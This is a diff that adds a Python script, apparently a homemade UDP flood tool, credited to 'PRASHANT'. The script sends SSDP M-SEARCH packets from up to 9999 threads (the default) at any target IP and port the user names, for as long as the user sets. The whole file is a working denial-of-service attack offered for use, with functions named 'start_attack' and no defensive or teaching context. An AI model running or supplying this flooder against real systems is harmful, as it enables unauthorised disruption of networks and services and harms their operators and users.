@@ -1,0 +1,81 @@
+
+
+#!/usr/bin/env python3
+
+import socket
+import time
+import threading
+import sys
+
+def generate_powerful_message():
+    """Generate a more complex and larger HTTP-like message."""
+    message = (
+        "M-SEARCH * HTTP/1.1\r\n"
+        "HOST: 255.255.255.255:1900\r\n"
+        "MAN: \"ssdp:discover\"\r\n"
+        "MX: 1\r\n"
+        "ST: urn:dial-multiscreen-org:service:dial:1\r\n"
+        "USER-AGENT: Google Chrome/60.0.3112.90 Windows\r\n"
+        "CACHE-CONTROL: max-age=3600\r\n"
+        "EXT:\r\n"
+        "LOCATION: http://example.com/service-description.xml\r\n"
+        "SERVER: Custom/1.0\r\n"
+        "AL: http://example.com/alternate-description.xml\r\n"
+        "CONTENT-LENGTH: 10000\r\n"  # Increase message size
+        "\r\n"
+        "Service Discovery Request with additional headers and details"
+    )
+    return message.encode('utf-8')
+
+def send_udp_packets(target_ip, target_port, duration):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    message = generate_powerful_message()
+    
+    end_time = time.time() + duration
+    packet_count = 0
+    
+    while time.time() < end_time:
+        try:
+            sock.sendto(message, (target_ip, target_port))
+            packet_count += 1
+            time.sleep(0.01)  # Reduce delay between packets for higher frequency
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            break
+
+    sock.close()
+    print(f"Thread finished. Packets sent: {packet_count}")
+
+def start_attack(target_ip, target_port, duration, threads):
+    thread_list = []
+    
+    # Start threads
+    for i in range(threads):
+        thread = threading.Thread(target=send_udp_packets, args=(target_ip, target_port, duration))
+        thread_list.append(thread)
+        thread.start()
+        print(f"Thread {i+1} started")
+
+    for thread in thread_list:
+        thread.join()
+
+    print("Attack finished.")
+
+def main():
+    if len(sys.argv) < 4 or len(sys.argv) > 5:
+        print("Usage: %s <target> <port> <time> [threads]" % sys.argv[0])
+        print("Made by: PRASHANT")
+        sys.exit(1)
+    
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2])
+    duration = int(sys.argv[3])  # Duration in seconds
+    threads = 9999  # Default number of threads
+
+    if len(sys.argv) == 5:
+        threads = int(sys.argv[4])
+
+    start_attack(target_ip, target_port, duration, threads)
+
+if __name__ == "__main__":
+    main()
